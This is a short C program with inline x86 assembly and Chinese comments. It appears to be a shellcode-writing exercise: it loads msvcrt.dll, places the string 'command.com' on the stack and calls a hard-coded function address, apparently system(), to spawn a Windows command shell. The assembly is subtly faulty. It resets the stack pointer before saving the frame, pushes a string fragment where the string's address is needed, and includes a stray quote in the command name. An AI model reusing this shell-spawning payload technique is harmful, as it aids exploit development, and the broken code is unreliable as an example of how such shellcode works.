#include <windows.h>
#include <winbase.h>
void main()
{
       LoadLibrary("msvcrt.dll");
       __asm {

				mov esp,ebp                 ;把ebp的内容赋值给esp
				push ebp                    ;保存ebp，esp－4
				mov ebp,esp                 ;给ebp赋新值，将作为局部变量的基指针
				sub esp, 0Ch			;
				mov eax, 6D6D6F63h			;
				mov dword ptr [ebp-0Ch], eax	;
				mov eax, 2E646E61h			;
				mov dword ptr [ebp-08h], eax	;
				mov eax, 226D6F63h		;
				mov dword ptr [ebp-04h], eax
				xor edx, edx
				mov byte ptr [ebp-01], dl
				push eax
				mov eax, 0x77bf8044
				call eax
       }
}

